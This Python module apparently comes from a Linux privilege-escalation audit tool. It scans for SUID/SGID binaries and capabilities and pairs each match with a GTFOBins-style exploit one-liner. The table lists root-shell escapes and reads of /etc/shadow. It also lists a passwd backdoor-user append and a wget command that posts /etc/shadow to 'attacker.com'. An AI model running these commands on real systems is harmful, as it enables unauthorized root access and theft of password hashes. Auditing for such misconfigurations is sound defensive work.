"""
Module: SUID/SGID Binary Scanner
Identifies binaries with SUID/SGID bits that could allow privilege escalation.

Commands used:
  find / -perm -4000 -type f 2>/dev/null    → SUID binaries
  find / -perm -2000 -type f 2>/dev/null    → SGID binaries
  getcap -r / 2>/dev/null                   → Linux capabilities

References:
  GTFOBins : https://gtfobins.github.io
  HackTricks SUID: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
"""

import subprocess
import os
from modules.banner import Colors, ok, warn, info, finding, severity_label

# High-risk SUID binaries that have known GTFOBins exploit paths
# Source: https://gtfobins.github.io
GTFOBINS_SUID = {
    'bash'      : 'bash -p  # Drops into root shell',
    'sh'        : 'sh -p',
    'dash'      : 'dash -p',
    'find'      : 'find . -exec /bin/sh -p \\; -quit',
    'awk'       : "awk 'BEGIN {system(\"/bin/sh\")}'",
    'gawk'      : "gawk 'BEGIN {system(\"/bin/sh\")}'",
    'nawk'      : "nawk 'BEGIN {system(\"/bin/sh\")}'",
    'perl'      : "perl -e 'exec \"/bin/sh\";'",
    'python'    : "python -c 'import os;os.system(\"/bin/sh\")'",
    'python2'   : "python2 -c 'import os;os.system(\"/bin/sh\")'",
    'python3'   : "python3 -c 'import os;os.system(\"/bin/sh\")'",
    'ruby'      : "ruby -e 'exec \"/bin/sh\"'",
    'php'       : "php -r 'pcntl_exec(\"/bin/sh\");'",
    'vim'       : "vim -c ':!/bin/sh'",
    'vi'        : "vi -c ':!/bin/sh'",
    'nano'      : '^R^X then: reset; sh 1>&0 2>&0',
    'less'      : "less /etc/passwd  then: !/bin/sh",
    'more'      : "more /etc/passwd  then: !/bin/sh",
    'man'       : "man man  then: !/bin/sh",
    'nmap'      : "nmap --interactive  then: !sh",
    'wget'      : "wget --post-file=/etc/shadow attacker.com",
    'curl'      : "curl file:///etc/shadow",
    'cp'        : "cp /bin/sh /tmp/sh; chmod +s /tmp/sh",
    'mv'        : "mv /tmp/evil /etc/cron.d/evil",
    'tee'       : "echo 'root2::0:0::/root:/bin/bash' | tee -a /etc/passwd",
    'dd'        : "dd if=/etc/shadow",
    'xxd'       : "xxd /etc/shadow | xxd -r",
    'base64'    : "base64 /etc/shadow | base64 -d",
    'cat'       : "cat /etc/shadow",
    'head'      : "head /etc/shadow",
    'tail'      : "tail /etc/shadow",
    'tar'       : "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    'zip'       : "zip /tmp/test.zip /tmp/test -T --unzip-command=\"sh -c /bin/sh\"",
    'env'       : "env /bin/sh -p",
    'strace'    : "strace -o /dev/null /bin/sh -p",
    'ltrace'    : "ltrace -b -L /bin/sh -p",
    'gdb'       : "gdb -nx -ex 'python import os; os.execv(\"/bin/sh\", [\"sh\"])' -ex quit",
    'expect'    : "expect -c 'spawn /bin/sh -p; interact'",
    'tclsh'     : "tclsh  then: exec /bin/sh -p",
    'node'      : "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {\"-p\":1, stdio:[0,1,2]})'",
    'lua'       : "lua -e 'os.execute(\"/bin/sh\")'",
    'rvim'      : "rvim -c ':python import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    'ftp'       : "ftp  then: !/bin/sh",
    'mysql'     : "mysql -e '\\! /bin/sh'",
    'sqlite3'   : "sqlite3 /dev/null '.shell /bin/sh'",
    'journalctl': "journalctl  then: !/bin/sh",
    'systemctl' : "systemctl  then: !/bin/sh",
    'git'       : "git help config  then: !/bin/sh",
    'rsync'     : "rsync -e 'sh -p -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    'ssh'       : "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    'taskset'   : "taskset 1 /bin/sh -p",
    'timeout'   : "timeout 7d /bin/sh -p",
    'watch'     : "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
}

# SUID binaries that are standard/expected (whitelist)
STANDARD_SUID = {
    'sudo', 'su', 'passwd', 'chsh', 'chfn', 'newgrp', 'mount', 'umount',
    'ping', 'ping6', 'traceroute', 'traceroute6', 'pkexec', 'polkit-agent',
    'gpasswd', 'crontab', 'at', 'fusermount', 'fusermount3', 'newuidmap',
    'newgidmap', 'unix_chkpwd', 'ssh-keysign', 'pt_chown', 'dotlockfile'
}


class SUIDScanner:
    def __init__(self):
        self.findings = {}

    def _run(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
            return result.stdout.strip()
        except Exception:
            return ""

    def scan(self):
        data = {
            'suid_binaries'         : [],
            'sgid_binaries'         : [],
            'exploitable_suid'      : [],
            'unexpected_suid'       : [],
            'capabilities'          : [],
        }

        # SUID binaries
        suid_raw = self._run("find / -perm -4000 -type f 2>/dev/null")
        for path in suid_raw.splitlines():
            path = path.strip()
            if not path:
                continue
            name = os.path.basename(path)
            entry = {'path': path, 'name': name}
            data['suid_binaries'].append(entry)

            if name.lower() in GTFOBINS_SUID:
                entry['exploit'] = GTFOBINS_SUID[name.lower()]
                entry['gtfobins'] = f"https://gtfobins.github.io/gtfobins/{name.lower()}/#suid"
                data['exploitable_suid'].append(entry)
            elif name.lower() not in STANDARD_SUID:
                data['unexpected_suid'].append(entry)

        # SGID binaries
        sgid_raw = self._run("find / -perm -2000 -type f 2>/dev/null")
        for path in sgid_raw.splitlines():
            path = path.strip()
            if path:
                data['sgid_binaries'].append({'path': path, 'name': os.path.basename(path)})

        # Linux capabilities
        cap_raw = self._run("getcap -r / 2>/dev/null")
        for line in cap_raw.splitlines():
            if line.strip():
                data['capabilities'].append(line.strip())

        self.findings = data
        return self.findings

    def display(self):
        d = self.findings
        info(f"Total SUID binaries found : {len(d['suid_binaries'])}")
        info(f"Total SGID binaries found : {len(d['sgid_binaries'])}")

        if d['exploitable_suid']:
            print(f"\n  {Colors.RED}{Colors.BOLD}⚠  EXPLOITABLE SUID BINARIES (GTFOBins Match):{Colors.RESET}")
            for b in d['exploitable_suid']:
                finding('CRITICAL', f"{b['path']}")
                print(f"           {Colors.YELLOW}Exploit → {b['exploit']}{Colors.RESET}")
                print(f"           {Colors.CYAN}Reference: {b['gtfobins']}{Colors.RESET}")
        else:
            ok("No exploitable SUID binaries detected")

        if d['unexpected_suid']:
            print(f"\n  {Colors.YELLOW}Unexpected SUID binaries (manual review required):{Colors.RESET}")
            for b in d['unexpected_suid']:
                finding('MEDIUM', f"{b['path']} – Check: https://gtfobins.github.io")

        if d['capabilities']:
            print(f"\n  {Colors.YELLOW}Linux Capabilities (potential escalation):{Colors.RESET}")
            for cap in d['capabilities']:
                finding('HIGH', f"Capability: {cap}")
        else:
            ok("No dangerous Linux capabilities found")